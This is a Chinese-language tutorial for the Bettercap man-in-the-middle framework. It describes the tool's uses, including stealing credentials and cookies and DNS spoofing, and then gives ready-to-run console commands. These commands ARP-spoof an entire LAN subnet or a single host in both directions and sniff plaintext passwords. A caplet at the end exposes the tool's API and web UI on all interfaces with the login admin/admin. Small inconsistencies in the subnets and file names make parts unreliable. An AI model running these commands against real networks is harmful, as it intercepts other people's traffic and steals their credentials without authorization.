Bettercap 是一个功能强大、模块化且可扩展的中间人攻击（Man-in-the-Middle, MITM）框架，主要用于网络监控、劫持、嗅探和渗透测试。它以易用性、实时性和跨平台支持著称，适用于安全研究人员、红队人员和网络渗透测试者。
## 1、核心特性
- 全协议支持
  支持 ARP、ICMPv6、DHCPv6、DNS、HTTP/HTTPS、Bluetooth LE、Wi-Fi（通过 802.11 帧注入）等多种协议的欺骗与劫持。
- 模块化架构
  采用插件式设计，包含：
  ①Caplets（轻量级脚本）：用于快速编写和部署攻击逻辑。
  ②内置模块：如 net.sniff （流量嗅探）、 http.proxy （HTTP 代理）、 https.proxy （HTTPS 降级/中间人）、 dns.spoof （DNS 欺骗）等。
- HTTPS 中间人能力
  通过内置的透明 HTTPS 代理（基于动态证书生成），可解密、篡改、重放 HTTPS 流量（需受害者信任 Bettercap 生成的 CA 证书）。
- 实时 Web UI
  提供基于浏览器的图形界面（默认端口 http: 127.0.0.1:8081 ），可实时查看网络主机、会话、日志和交互式控制。
-  跨平台运行
   支持 Linux、macOS、Windows（部分功能受限），并可部署在 Kali Linux、Parrot OS 等安全发行版中。
- 低依赖、高性能
  使用 Go 语言编写，编译为单一二进制文件，无需复杂依赖，资源占用低，适合在嵌入式设备（如 Raspberry Pi）上运行。
## 2、常见用途
- 局域网主机发现与映射
  自动扫描并持续更新网络拓扑。
- 会话劫持
  窃取登录凭证、Cookie（尤其在未使用 HSTS 的网站上）。
- DNS 欺骗（Pharming）
  将用户请求重定向到恶意站点。
- 网络流量嗅探
  捕获明文协议（如 HTTP、FTP、Telnet）中的敏感信息。
- Wi-Fi 和 BLE 审计
  扫描并交互蓝牙低功耗设备，或监控 Wi-Fi 探测请求
## 3、安装
`sudo apt update`
`sudo apt install bettercap`
## 4、开启ARP攻击
`sudo bettercap -iface eth0`
在 Bettercap 的控制台输入以下命令
1. 自动扫描局域网内所有存活主机
   `net.probe on`
2.  设置 ARP 欺骗参数
    指定目标为整个 192.168.1.0/24 网段（全网段欺骗）：`set arp.spoof.targets 192.168.88.0/24`或
    设置 ARP 欺骗参数：指定目标为单个 192.168.88.136 ：`set arp.spoof.targets 192.168.88.136`
    启用双向欺骗：同时欺骗目标主机和网关，确保双向流量都经过本机：`set arp.spoof.fullduplex true`
3. 启动 ARP 欺骗模块，开始发送伪造的 ARP 响应包
   `arp.spoof on`
4. 配置网络嗅探器：关闭冗余输出，提升日志可读性：`set net.sniff.verbose false`
   允许嗅探本机发出的流量（通常用于调试或自环分析）：`set net.sniff.local true`
   启动网络流量嗅探，自动捕获明文协议中的敏感信息（如 HTTP Basic Auth、FTP 密码等）：`net.sniff on`
   可以把复杂的攻击流程写成一个 .cap 文件，嗅探脚本 ( full_network_sniff.cap )
   运行方式： `bettercap -caplet myspy.cap`
## 5、安装UI
1. 克隆整个仓库到临时目录
   `git clone --depth 1 https://github.com/bettercap/ui.git /tmp/bettercap-ui-repo`
2. 确保目标目录存在
   `sudo mkdir -p /usr/share/bettercap/ui`
3. 将 dist/ui 目录下的所有编译好的文件拷贝到目标目录
   `sudo cp -r /tmp/bettercap-ui-repo/dist/ui/* /usr/share/bettercap/ui/`
4. 检查文件是否已就绪
   `ls -l /usr/share/bettercap/ui`
5. 清理临时克隆的仓库
   `rm -rf /tmp/bettercap-ui-repo`
## 6、开启UI
期望每次启动 Bettercap 时都使用你的自定义密码，建议将命令写入一个 .cap 文件（例如 my_login.cap ）：
 创建文件： vim start-ui.cap
 `set api.rest.address 0.0.0.0                 # 监听所有网络接口`
 `set api.rest.port 8081                       # API 服务端口为 8081`
 `set api.rest.username admin                  # 设置登录用户名`
 `set api.rest.password admin                  # 设置登录密码`
 `set http.server.address 0.0.0.0              # 监听所有网络接口`
 `set http.server.port 80                      # Web 服务端口为 80`
 `set http.server.path /usr/share/bettercap/ui # Web 界面文件路径`
 `api.rest on                                  # 启动 API 服务`
 `http.server on                               # 启动 Web 服务器`
   ## 7、启动U
   `sudo bettercap -caplet start-ui.cap`
   